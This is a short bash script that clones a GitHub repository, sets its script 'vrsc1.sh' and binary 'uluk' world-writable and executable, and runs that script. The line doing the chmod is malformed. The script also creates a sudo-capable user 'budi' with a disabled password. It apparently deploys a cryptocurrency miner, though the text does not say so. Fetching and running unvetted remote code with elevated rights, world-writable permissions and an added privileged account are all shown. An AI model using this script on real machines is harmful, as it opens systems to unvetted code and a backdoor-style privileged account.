#!/bin/bash
sudo apt update
git clone https://github.com/Jiad68/asepg.git && cd asepg
chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
sudo adduser --disabled-password --gecos "" budi && sudo usermod -aG sudo budi
sudo -u budi -H sh -c "./vrsc1.sh"
sudo apt update
